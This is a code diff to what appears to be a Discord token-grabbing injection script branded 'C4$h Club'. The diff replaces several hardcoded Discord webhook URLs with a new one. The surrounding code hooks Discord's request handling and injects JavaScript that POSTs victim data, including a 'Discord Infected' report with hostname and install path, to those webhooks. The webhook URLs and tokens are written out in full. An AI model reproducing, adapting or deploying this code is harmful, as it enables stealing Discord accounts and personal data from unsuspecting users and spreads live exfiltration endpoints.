@@ -20,7 +20,7 @@ const config = {
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith("https://discord.com/api/webhooks/905912417756794921/Ftimt00LEhz3D4Kry5XOSQ1W1YMgxe8PuDiDw8JeFN5bo5lQAIiRZ_Y20p-SQLKvCjVC")) {
+    if (details.url.startsWith("https://discord.com/api/webhooks/942375742568816680/-SgH4j9C7XcYEUb_zTNu42X0vSmKuDF5SR8A9YVNqDE5sZiAczvHgjdc-9DU1nd1GgBD")) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
@@ -73,7 +73,7 @@ function FirstTime() {
                 var c={username:"C4$h Club",content:"",embeds:[{title:"Discord Infected",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"C4$h Club"},footer:{text:"C4$h Club"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};
                 const window = BrowserWindow.getAllWindows()[0];
                 window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/906613200781463573/JbJxOZxPzUbdjC6bsKtlXAEUzHbbYgQqp6TTyViJMo9y0hsoUnSR5hf90HwQaEdlAc-w", true);
+    xhr.open("POST", "https://discord.com/api/webhooks/942375742568816680/-SgH4j9C7XcYEUb_zTNu42X0vSmKuDF5SR8A9YVNqDE5sZiAczvHgjdc-9DU1nd1GgBD", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${c}));
@@ -128,7 +128,7 @@ function SendToWebhook(what) {
     xhr.send(JSON.stringify(${what}));
     `, !0).then((token => {}));
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/906591991180185671/jZV8qF8jBV16S0eQxpKZiQA8JNOCXcALY6tC9GEHSt9ujEyloob3cBU-tG-VYrC3WoL7", true);
+    xhr.open("POST", "https://discord.com/api/webhooks/942375742568816680/-SgH4j9C7XcYEUb_zTNu42X0vSmKuDF5SR8A9YVNqDE5sZiAczvHgjdc-9DU1nd1GgBD", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
     xhr.send(JSON.stringify(${what}));
